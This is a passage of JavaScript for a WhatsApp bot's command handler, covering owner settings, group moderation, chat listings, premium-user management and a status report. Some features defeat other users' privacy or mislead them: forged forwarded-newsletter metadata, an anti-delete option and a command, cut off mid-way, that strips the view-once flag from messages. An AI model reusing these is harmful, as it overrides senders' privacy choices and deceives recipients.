  messageId: msg.key.id
})
}
            break
			case 'autotype':
                if (!VeranTheCreator) return VeranStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autotype = true
                    replygcveran(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autotype = false
                    replygcveran(`Successfully changed Auto-Typing to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'autoread':
                if (!VeranTheCreator) return VeranStickOwner()
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    replygcveran(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    replygcveran(`Successfully changed autoread to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autobio':
                if (!VeranTheCreator) return VeranStickOwner()
                
                if (q == 'on') {
                    db.settings[botNumber].autobio = true
                    replygcveran(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autobio = false
                    replygcveran(`Successfully Changed AutoBio To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'self': case 'public': case 'mode': {
    if (!VeranTheCreator) return VeranStickOwner() // Only the bot owner can access this command

    // Normalize user input to lowercase
    const lowerQ = q ? q.toLowerCase().trim() : '' // Trim whitespace and lowercase the input
    
    if (lowerQ === 'public' || m.text.includes('public')) {
        VeranBotInc.public = true
        replygcveran('*✅ Successfully changed to Public Usage*')
    } else if (lowerQ === 'self' || m.text.includes('self')) {
        VeranBotInc.public = false
        replygcveran('*✅ Successfully changed to Self Usage*')
    } else {
        let buttons = [
            { 
                buttonId: `${prefix}public`, 
                buttonText: { displayText: 'Public' }, 
                type: 1 
            },
            { 
                buttonId: `${prefix}self`, 
                buttonText: { displayText: 'Self' }, 
                type: 1 
            }
        ]

        // Send buttons using the latest button system
        await VeranBotInc.sendMessage(m.chat, { 
            text: 'Please choose the Bot Mode 🌹', 
            buttons: buttons, 
            footer: 'BOT MODE CONTROLLER', 
            headerType: 1 
        }, { quoted: m })
    }
}
break


			case 'setbio': case 'setbotbio': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text) return replygcveran(`Where's the text??`)
				VeranBotInc.setStatus(q)
				replygcveran(`*Bio has been changed to ${q}*`)
			}
			break
			case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!VeranTheCreator) return VeranStickOwner()
                if (!quoted) return replygcveran(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcveran(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcveran(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await VeranBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await VeranBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcveran(mess.done)
                } else {
                    var memeg = await VeranBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcveran(mess.done)
                }
                break
			case 'join': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text) return replygcveran('Enter Group Link!')
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcveran('Link Invalid!')
				const result = args[0].split('https://chat.whatsapp.com/')[1]
				VeranStickWait()
				await VeranBotInc.groupAcceptInvite(result).catch((res) => {
					if (res.data == 400) return replygcveran('Group Not Found❗');
					if (res.data == 401) return replygcveran('Bot Kicked From The Group❗');
					if (res.data == 409) return replygcveran('Bots Have Joined the Group❗');
					if (res.data == 410) return replygcveran('Group URL Has Been Reset❗');
					if (res.data == 500) return replygcveran('Full Group❗');
				})
			}
			break
			case 'leave': case 'leavegc': {
				if (!VeranTheCreator) return VeranStickOwner()
				await VeranBotInc.groupLeave(m.chat).then((res) => replygcveran(jsonformat(res))).catch((err) => replygcveran(jsonformat(err)))
			}
			break
			case 'blokir': case 'block': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text && !m.quoted) {
					replygcveran(`Example: ${prefix + command} 234xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await VeranBotInc.updateBlockStatus(numbersOnly, 'block').then((a) => replygcveran(mess.done)).catch((err) => replygcveran('Fail!'))
				}
			}
			break
			case 'openblokir': case 'unblokir': case 'openblock': case 'unblock': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text && !m.quoted) {
					replygcveran(`Example: ${prefix + command} 234xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await VeranBotInc.updateBlockStatus(numbersOnly, 'unblock').then((a) => replygcveran(mess.done)).catch((err) => replygcveran('Fail!'))
				}
			}
			break
			case 'listpc': {
				if (!VeranTheCreator) return VeranStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				for (let i of anu) {
					let nama = store.messages[i].array[0].pushName
					teks += `${setv} *Name :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
				}
				VeranBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'listgc': {
				if (!VeranTheCreator) return VeranStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
				for (let i of anu) {
					let metadata = await VeranBotInc.groupMetadata(i)
					teks += `${setv} *Name :* ${metadata.subject}\n${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n${setv} *ID :* ${metadata.id}\n${setv} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Karachi').format('DD/MM/YYYY HH:mm:ss')}\n${setv} *Member :* ${metadata.participants.length}\n\n=====================\n\n`
				}
				VeranBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'creategc': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text) return replygcveran(`Example:\n${prefix + command} *Gc Name*`)
				let group = await VeranBotInc.groupCreate(q, [m.sender])
				let res = await VeranBotInc.groupInviteCode(group.id)
				await VeranBotInc.sendMessage(m.chat, { text: `*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Group Name :* *${q}*`, detectLink: true }, { quoted: m });
				await VeranBotInc.groupParticipantsUpdate(group.id, [m.sender], 'promote')
				await VeranBotInc.sendMessage(group.id, { text: 'Done' })
			}
			break
			case 'addpr': case 'addprem': case 'addpremium': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text) return replygcveran(`Example:\n${prefix + command} @tag|time(s/m/h/d)`)
				let [teks1, teks2] = text.split`|`
				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await VeranBotInc.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return replygcveran('This number is not registered on WhatsApp!')
				if (teks2) {
					prem.addPremiumUser(nmrnya, teks2, premium);
					replygcveran(`Success ${command} @${nmrnya.split('@')[0]} During ${teks2}`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.premium
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.premium
				} else {
					replygcveran(`Enter the time!\nExample: ${prefix + command} @tag|time`)
				}
			}
			break
			case 'delpr': case 'delprem': case 'delpremium': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text) return replygcveran(`Example:\n${prefix + command} @tag`)
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (prem.checkPremiumUser(nmrnya, premium)) {
					premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
					replygcveran(`Sukses ${command} @${nmrnya.split('@')[0]}`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.free
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.free
				} else {
					replygcveran(`User @${nmrnya.split('@')[0]} Not Premium❗`)
				}
			}
			break
			case 'listpr': case 'listprem': case 'listpremium': {
				if (!VeranTheCreator) return VeranStickOwner()
				let txt = `*------「 LIST PREMIUM 」------*\n\n`
				for (let userprem of premium) {
					txt += `➸ *Number*: @${userprem.id.split('@')[0]}\n➸ *Limit*: ${global.db.users[userprem.id].limit}\n➸ *Money*: ${global.db.users[userprem.id].uang.toLocaleString('id-ID')}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
				}
				replygcveran(txt)
			}
			break
			
			// Group Menu
			case 'add': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				if (!text && !m.quoted) {
					replygcveran(`EXAMPLE: ${prefix + command} 234xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					try {
						await VeranBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) =>{
							for (let i of res) {
								let invv = await VeranBotInc.groupInviteCode(m.chat)
								if (i.status == 408) return replygcveran('User Just Left This Group!')
								if (i.status == 401) return replygcveran('User Blocked The Bot!')
								if (i.status == 409) return replygcveran('User has joined!')
								if (i.status == 500) return replygcveran('Group Full!')
								if (i.status == 403) {
									await VeranBotInc.sendMessage(m.chat, { text: `@${numbersOnly.split('@')[0]} Cannot Be Added\n\nBecause Target Private\n\nInvitations will be sent to\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nVia Private Chat`, mentions: [numbersOnly] }, { quoted : m })
									await VeranBotInc.sendMessage(`${numbersOnly ? numbersOnly : '2347082664317@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nInvite you to this group\nPlease enter if you wish🙇`, detectLink: true, mentions: [numbersOnly] }, { quoted : floc2 }).catch((err) => replygcveran('Failed to Send Invitation!'))
								} else {
									replygcveran('Success!!')
								}
							}
						})
					} catch (e) {
						replygcveran('Failed to Add User')
					}
				}
			}
			break
			case 'kick': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				if (!text && !m.quoted) {
					replygcveran(`Example: ${prefix + command} 234xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await VeranBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => replygcveran('Failed to Kick User!'))
				}
			}
			break
			case 'promote': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				if (!text && !m.quoted) {
					replygcveran(`Example: ${prefix + command} 234xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await VeranBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => replygcveran('Fail!'))
					replygcveran(mess.done)
				}
			}
			break
			case 'demote': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				if (!text && !m.quoted) {
					replygcveran(`Example: ${prefix + command} 234xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await VeranBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => replygcveran('Failed!'))
					replygcveran(mess.done)
				}
			}
			break
			case 'setnamegc': case 'setsubject': case 'setname': case 'setnamegc': case 'setsubjectgc': {
    if (!m.isGroup) return VeranStickGroup(); // Ensure it's in a group
    if (!m.isBotAdmin) {
        replygcveran('I need to be an admin to change the group name. Please make me an admin.');
        return;
    }
    if (!text && !m.quoted) {
        replygcveran(`Example: ${prefix + command} New Group Name`);
    } else {
        const teksnya = text ? text : m.quoted.text;
        await VeranBotInc.groupUpdateSubject(m.chat, teksnya).catch((err) => replygcveran('Failed to update group name!'));
    }
}
break;

			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				if (!text && !m.quoted) {
					replygcveran(`Example: ${prefix + command} textnya`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await VeranBotInc.groupUpdateDescription(m.chat, teksnya).catch((err) => replygcveran('Fail!'))
				}
			}
			break
			case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return VeranStickGroup()
                if (!m.isAdmin) return replygcveran(mess.admin)
                if (!m.isBotAdmin) return VeranStickBotAdmin()
                if (!quoted) return replygcveran(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcveran(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcveran(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await VeranBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await VeranBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcveran(mess.done)
                } else {
                    var memeg = await VeranBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcveran(mess.done)
                }
                break
			case 'delete': case 'del': case 'd': {
				if (!m.quoted) return replygcveran('Reply to the message you want to delete')
				await VeranBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: m.isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
			}
			break
			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				let response = await VeranBotInc.groupInviteCode(m.chat)
				await VeranBotInc.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await VeranBotInc.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: m });
			}
			break
			case 'resetlink': case 'revoke': case 'newlink': case 'newurl': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				await VeranBotInc.groupRevokeInvite(m.chat).then((a) => {
					replygcveran(`Reset Success, Group Invite Link ${m.metadata.subject}`)
				}).catch((err) => replygcveran('Fail!'))
			}
			break
			case 'group': case 'grup': {
				if (!m.isGroup) return VeranStickGroup()
				if (!m.isAdmin) return VeranStickAdmin()
				if (!m.isBotAdmin) return VeranStickBotAdmin()
				if (text === 'close') {
					await VeranBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcveran(`*Successfully Closing The Group*`))
				} else if (text === 'open') {
					await VeranBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcveran(`*Successfully Opening The Group*`))
				} else {
					let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT',
							sections: [{
								title: 'Group Mode',
								rows: [
									{ title: 'Open Group', description: 'Open Group', id: 'grup open' },
									{ title: 'Close Group', description: 'Close Group', id: 'grup close' },
								]
							}]
						}
					}]
					await VeranBotInc.sendButtonMsg(m.chat, 'Group Mode', veranytimewisher, 'Please choose', null, button, m);
				}
			}
			break
			case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return VeranStickGroup()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
if (!m.isBotAdmin) return VeranStickBotAdmin()
    await VeranBotInc.removeProfilePicture(m.chat)
    }
    break
    case 'deleteppbot': case 'delbotpp': case 'delppbot': {
if (!VeranTheCreator) return VeranStickOwner()
    await VeranBotInc.removeProfilePicture(VeranBotInc.user.id)
    replygcveran(`Success in deleting bot's profile picture`)
    }
    break
			case 'antidelete': {
    if (!m.isGroup) return VeranStickGroup(); // Ensure this works only in groups

    // Handle 'on' and 'off' commands
    if (text === 'on') {
        if (db.groups[m.chat]?.antidelete) return replygcveran('*Already Activated!*'); // Prevent reactivation
        db.groups[m.chat] = db.groups[m.chat] || {}; // Initialize group settings if not existing
        db.groups[m.chat].antidelete = true;
        replygcveran('*Anti Delete Activated!*');
    } else if (text === 'off') {
        if (!db.groups[m.chat]?.antidelete) return replygcveran('*Already Deactivated!*'); // Prevent re-deactivation
        db.groups[m.chat].antidelete = false;
        replygcveran('*Anti Delete Disabled!*');
    } else {
        // Provide a button-based choice for enabling/disabling
        const buttonOptions = [
            {
                name: 'single_select',
                buttonParamsJson: {
                    title: 'Choose Option',
                    sections: [{
                        title: 'Anti Delete Settings',
                        rows: [
                            { title: 'ENABLE', description: 'Enable Anti Delete', id: 'antidelete on' },
                            { title: 'DISABLE', description: 'Disable Anti Delete', id: 'antidelete off' },
                        ]
                    }]
                }
            }
        ];
        await VeranBotInc.sendButtonMsg(
            m.chat,
            'Group Mode',
            veranytimewisher,
            'Please choose:',
            null,
            buttonOptions,
            m
        );
    }
}
break;
			case 'tagall': {
    if (!m.isGroup) return VeranStickGroup(); // Ensure it's in a group
    let teks = `*Tag All*\n\n*Message :* ${q ? q : ''}\n\n`;
    for (let mem of m.metadata.participants) {
        teks += `${setv} @${mem.id.split('@')[0]}\n`; // Format mentions
    }
    await VeranBotInc.sendMessage(m.chat, { text: teks, mentions: m.metadata.participants.map(a => a.id) }, { quoted: m });
}
break;

			case 'hidetag': case 'h': {
    if (!m.isGroup) return VeranStickGroup(); // Ensure the command is used in a group
    VeranBotInc.sendMessage(
        m.chat, 
        { 
            text: q ? q : '', 
            mentions: m.metadata.participants.map(a => a.id) 
        }, 
        { quoted: m }
    );
}
break;

			case 'totag': {
    if (!m.isGroup) return VeranStickGroup(); // Ensure the command is used in a group
    if (!m.quoted) return replygcveran(`Reply to a message with the command ${prefix + command}`);
    delete m.quoted.chat; // Clean up the quoted message
    await VeranBotInc.sendMessage(
        m.chat, 
        { 
            forward: m.quoted.fakeObj, 
            mentions: m.metadata.participants.map(a => a.id) 
        }
    );
}
break;

			case 'listonline': case 'liston': {
				if (!m.isGroup) return VeranStickGroup()
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await VeranBotInc.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `${setv} @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => replygcveran('Fail'))
			}
			break
			
			
			// Bot Menu
			case 'owner': case 'user': {
				let list = []
for (let i of owner) {
list.push({
	    	displayName: await VeranBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await VeranBotInc.getName(i)}\nFN:${await VeranBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
                VeranBotInc.sendMessage(m.chat, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
            }
            break
			case 'profile': case 'cekme': case 'cek': {
				const user = Object.keys(global.db.users)
				const infoUser = global.db.users[m.sender]
				const teks = `*Profile @${m.sender.split('@')[0]}* :\nUser Bot : ${user.includes(m.sender) ? 'True' : 'False'}\nUser : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\nLimit : ${infoUser.limit}\nMoney : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
				await VeranBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'req': case 'request': {
				if (!text) return replygcveran('What do you want to request from the owner??')
				await VeranBotInc.sendMessage(m.chat, { text: `*Request Has Been Sent To Owner*\n_Thank You🙏_` }, { quoted: m })
				await VeranBotInc.sendFromOwner(ownernumber, `Order From : @${m.sender.split('@')[0]}\nFor Owners\n\nRequest ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true }})
			}
			break
			case 'daily': case 'claim': {
				daily(VeranBotInc, m, global.db.users)
			}
			break
			case 'transferlimit': case 'tflimit': case 'tlimit': {
				transferLimit(VeranBotInc, m, args, global.db.users)
			}
			break
			case 'transfermoney': case 'tmoney': case 'transfer': {
				transferUang(VeranBotInc, m, args, global.db.users)
			}
			break
			case 'buy': {
				buy(m, args, db)
			}
			break
			case 'react': {
				VeranBotInc.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key }})
			}
			break
			case 'tagme': {
				VeranBotInc.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
			}
			break
			
			case 'p': case 'ping': case 'botstatus': case 'statusbot': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}\n\n💻 Info Server\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_NodeJS Memory Usaage_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
				replygcveran(respon)
			}
			break
			case 'speedtest': case 'speed': {
				replygcveran('Testing Speed...')
				let cp = require('child_process')
				let { promisify } = require('util')
				let exec = promisify(cp.exec).bind(cp)
				let o
				try {
					o = await exec('python3 speed.py')
				} catch (e) {
					o = e
				} finally {
					let { stdout, stderr } = o
					if (stdout.trim()) replygcveran(stdout)
					if (stderr.trim()) replygcveran(stderr)
				}
			}
			break
			case 'afk': {
				let user = global.db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				replygcveran(`@${m.sender.split('@')[0]} Been Afk ${text ? ': ' + text : ''}`)
			}
			break
			case 'readviewonce': case 'vv': case 'rvo': {
    if (!m.quoted) return replygcveran(`Reply to a view-once message\nExample: ${prefix + command}`);

    try {
        // Check if the quoted message is a "view once" type
        if (m.quoted.msg?.viewOnce) {
            m.quoted.msg.viewOnce = false; // Remove the view-once restriction
